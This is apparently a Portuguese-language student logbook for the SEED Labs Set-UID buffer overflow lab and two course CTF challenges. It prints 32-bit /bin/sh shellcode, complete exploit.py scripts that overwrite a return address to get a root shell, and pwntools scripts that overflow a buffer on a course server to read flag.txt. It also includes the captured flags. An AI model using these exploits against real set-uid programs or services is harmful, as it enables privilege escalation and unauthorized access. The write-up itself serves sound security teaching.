# SEED Labs - Buffer Overflow Attack Lab (Set-UID Version)

## Tarefa 1: Familiarizar-se com o *Shellcode*

* Depois de compilar o ficheiro *call_schellcode.c* com ```make```, foram gerados os ficheiros binários *a32.out* e *a64.out*

* Ao correr *a32.out* e *a64.out*, foi aberta uma *shell* funcional na qual podem ser corridos quaisquer comandos

## Tarefa 2: Compreender o Programa Vulnerável

* O conteúdo do ficheiro *badfile* deve ser o mesmo que o contéudo do ficheiro *a32.out*, dado que é esse o código binário executável a colocar na *stack* de maneira a correr *shellcode* e lançar uma *shell* - que, devido aos comandos presentes no Makefie, correrá com permissões *root*

## Tarefa 3: Lançar o Ataque num Programa de 32 bits (Nível 1)

* Tal como indicado no guião, criamos um ficheiro *badfile* com o comando ```touch badfile```, compilamos o programa em C com ```make``` e corremos o *debugger* com ```gdb stack-L1-dbg```

* No *debugger*, definimos um *break point* na função ```bof()``` com o comando ```b bof``` e executamos o programa (```run```)

* Verificamos que o *debugger* parou no *break point*, antes da chamada à função ```bof()``` - nesse momento, o valor de ```$ebp``` era 0xffffcf18

* Como pretendíamos verificar o valor de ```ebp``` depois da chamada à função anterior, corremos ```next``` e voltamos a imprimir o valor de ```$ebp``` (```p $ebp```), que passou a 0xffffcb08

* Imprimimos também o endereço-base do ```buffer``` (com ```p &buffer```), tendo obtido o valor 0xffffca9c

* Calculamos a diferença entre estes dois valores (0xffffcb08 - 0xffffca9c), tendo obtido como resultado 108 - a este valor somamos 4 (tamanho de cada registo numa arquitetura de 32 bits), obtendo 112: o *offset* entre o endereço-base do *buffer* e o local em que é guardado o endereço de retorno na *stack*

* Para lançar o ataque, editamos o ficheiro ```exploit.py```, especificamente:
* a variável ```shellcode``` passou a conter as instruções geradas anteriormente (na Tarefa 1) para criar uma *shell* numa arquitetura de 32 bits;

```python
shellcode = ( 
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')
```

* a variável ```start``` passou a conter ```517 - len(shellcode)```, de maneira a colocar o conteúdo de ```shellcode``` no final do ficheiro *badfile* (```content[start:start + len(shellcode)] = shellcode```), ou seja, após os NOPs;

```python
start = 517 - len(shellcode)
```

* a variável ```ret``` passou a conter ```0xffffca9c + 280```, sendo que 0xffffca9c é o endereço-base do *buffer* e 280 é um valor obtido experimentalmente entre 196 e 570, que garante que o endereço de retorno aponta para a região de NOPs do ficheiro *badfile* imediatamente antes do *shellcode* - assim, sabendo que o tamanho do ficheiro *badfile* é 517 bytes, que a região de NOPs antes do endereço de retorno ocupa 112 deles, que o endereço de retorno ocupa 4 e o *shellcode* ocupa 27, conclui-se que a região de NOPs para a qual o endereço de retorno deve apontar ocupa 374 (517 - 112 - 4 - 27) bytes, o que vai de encontro aos extremos da gama obtidos na prática;

```python
ret = 0xffffca9c + 280
```

* a variável ```offset```, conforme calculado anteriormente, passou a conter o valor 112, que corresponde à distância entre o endereço-base do *buffer* e a posição do endereço de retorno na *stack*;

```python
offset = 112
```

* Assim, o ficheiro *exploit.py*, passou a conter o código seguinte:
```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= ( 
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)        # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffca9c + 280         # Change this number 
offset = 112                      # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

* Correndo *exploit.py* (```./exploit.py```) e *stack-L1* (```./stack-L1```), verificou-se que se obteve uma *shell* com permissões *root*, conforme visível na imagem abaixo

![Tarefa 3](/images/logbook5-tarefa3.png)

* Em síntese, o ataque foi desenvolvido baseando-se na vulnerabilidade identificada no programa *stack.c* (*buffer overflow*), no conhecimento do endereço-base do *buffer* e do seu tamanho: o endereço de retorno "real/original" da função chamada (função *bof*) presente na *stack* -  cuja posição foi calculada a partir da diferença entre o endereço-base da variável *buffer* e a posição do *frame pointer* anterior na *stack* - foi substituído pelo endereço de memória no qual se encontra o *shellcode* (colocado na *stack* imediatamente acima da posição do endereço de retorno e precedido por uma série de NOPs para aumentar as probabilidades de sucesso em o alcançar/executar) para que, no retorno da função *bof*, esse código fosse executado

## Tarefa 4: Lançar o Ataque sem Saber o Tamanho do *Buffer* (Nível 2)

* Repetindo a parte inicial do processo anterior, corremos o *debugger* com ```gdb stack-L2-dbg``` e verificamos o endereço-base do *buffer*: 0xffffca60

* Para lançar o ataque de forma independente do tamanho do *buffer*, editamos o ficheiro ```exploit.py``` anterior, especificamente:

* a variável ```ret``` passou a conter ```0xffffca60 + 400```, sendo que 0xffffca60 é o endereço-base do *buffer* e 400 é um valor obtido experimentalmente, pelo menos acima de 200 (por ser o tamanho máximo do *buffer*) e somado de uma margem para ultrapassar parâmetros ou outros valores eventualmente presentes na *stack* - isto assegura que o endereço de retorno aponta para a região de NOPs do ficheiro *badfile* imediatamente antes do *shellcode*;

```python
ret = 0xffffca60 + 400
```

* a variável ```offset``` foi comentada por, neste caso, não se ter conhecimento da distância entre o endereço-base do *buffer* e a posição do endereço de retorno na *stack*, o que obrigou a que se fizesse *stack spraying* com o endereço de retorno pretendido, ou seja, um ciclo *for* para preencher todo o *buffer* com esse endereço de retorno - o ciclo itera desde o início até ao final do *buffer*, preenchendo-o, de 4 em 4 posições, com esse endereço (constituído por 4 bytes, devido à arquitetura de 32 bits);

```python
# offset = 112

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
for offset in range(0, 200, 4):
  content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
```

* Assim, o ficheiro *exploit.py*, passou a conter o código seguinte:
```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= ( 
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)        # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret = 0xffffca60 + 400            # Change this number 
# offset = 112                    # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
for offset in range(0, 200, 4):
  content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

* Correndo *exploit.py* (```./exploit.py```) e *stack-L2* (```./stack-L2```), verificou-se que se obteve uma *shell* com permissões *root*, conforme visível na imagem abaixo

![Tarefa 4](/images/logbook5-tarefa4.png)

* Em resumo, o ataque foi construído partindo apenas da identificação da vulnerabilidade no programa *stack.c* (*buffer overflow*), do conhecimento do endereço-base do *buffer* e do intervalo no qual se encontra o seu tamanho (entre 100 e 200 bytes): o *buffer* foi preenchido com múltiplas cópias do endereço de memória no qual se encontra o *shellcode* (colocado na *stack* imediatamente acima da posição do endereço de retorno e precedido por uma série de NOPs para aumentar as probabilidades de sucesso em o alcançar/executar), com o intuito de que uma delas ocupasse na *stack* a posição correspondente ao endereço de retorno "real/original" da função chamada (função *bof*), isto é, entre o valor do *frame pointer* anterior e os parâmetros da função, de modo que, no retorno da função *bof*, esse código fosse executado


# CTF 5

## Desafio 1

### Primeiro Passo - ```Checksec```

* Ao corrermos ```checksec program```, descobrimos várias informações:
```
❯ checksec program
  Arch:     i386-32-little
  RELRO:    No RELRO
  Stack:    No canary found
  NX:       NX disabled
  PIE:      No PIE (0x8048000)
  RWX:      Has RWX segments 
```
* o programa está compilado para uma arquitetura de 32 bits e é *little endian*
* o programa não tem proteção de *RELRO*
* a *stack* não tem um canário
* a *stack* tem perimssões de execução
* as posições do binário em memória não são aleatorizadas
* existem segmentos na memória com permissões de leitura (*read*), escrita (*write*) e execução (*execute*)

### Segundo Passo - Análise do Código

```cpp
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%40s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }


    fflush(stdout);
    
    return 0;
}
```

* Ao analisarmos o código, podemos ver que o ficheiro cujo nome é o valor da variável ```meme_file``` (```mem.txt```) é aberto e lido pelo programa

* É também visível que o programa lê 40 *chars* (```scanf("%40s", &buffer);```) para um *buffer* de 32 *chars*, o que nos permite realizar um *buffer overflow*

* Como o utilizador controla o *input*, ao escrever "flag.txt" após 32 caracteres, podemos facilmente sobrescrever o valor da variável ```meme_file``` (```mem.txt```) - armazenado  na zona das variáveis locais da *stack* - para fazer com que o programa leia o ficheiro ```flag.txt``` e imprima o seu conteúdo

### Terceiro Passo - *Exploit*

* No programa python disponibilizado (```exploit-example.py```), na linha em que se injeta o conteúdo para o servidor, bastou escrever 32 caracteres seguidos do nome do ficheiro que queremos ler, ou seja, ```r.sendline(b'A'*32+b'flag.txt\0')```

```python
#!/usr/bin/python3
from pwn import *

DEBUG = False

r = remote('ctf-fsi.fe.up.pt', 4003)

r.sendline(b'A'*32+b'flag.txt\0')

r.interactive()
```

* Ao executar o programa, conseguimos ter acesso ao conteúdo do ficheiro ```flag.txt``` e à flag do desafio: ```flag{a96d05c11752a85ff9f172636ea1967a}```, conforme comprova a imagem abaixo

![Flag](/images/logbook5-ctf1.png)

## Desafio 2

* Este desafio é bastante similar ao anterior

* Ao correr ```checksec program```, verificamos que o executável tem as mesmas permissões que anteriormente

* Contudo, foi feita uma alteração ao código-fonte do ficheiro ```main.c```, que se reflete numa nova organização da *stack*: entre a variável correspondente ao nome do ficheiro e o *buffer* existe um valor inteiro, que deve permanecer aí para que as operações de abertura e leitura do ficheiro sejam executadas

* Esta alteração não mitiga, de todo, o problema, dado que apenas é necessário realizar um *buffer overflow* semelhante ao anterior, mas que também coloque na posição correta da *stack* (entre o nome do ficheiro e o *buffer*) o valor ```0xfefc2324``` para se explorar a vulnerabilidade e ler a *flag*

* Para além disto, o único cuidado especial a ter é passar o valor do inteiro byte a byte e de forma *little endian* (de acordo com a arquitetura do programa anteriormente identificada), ou seja, ler o valor de trás para a frente

* Deste modo, o *script* em python executado foi o seguinte (```exploit-example.py```):

```python
#!/usr/bin/python3
from pwn import *

DEBUG = False

r = remote('ctf-fsi.fe.up.pt', 4000)

r.sendline(b'A'*32 + b"\x24\x23\xfc\xfe" + b"flag.txt\0")

r.interactive()
```

* Assim, ao passarmos a *string* em ```r.sendline(b'A'*32 + b"\x24\x23\xfc\xfe" + b"flag.txt\0")``` obtivemos a *flag*: ```flag{bb0e0ad81a5d4378e34817e1e73e5381}```, conforme comprova a imagem abaixo

![Flag](/images/logbook5-ctf2.png)
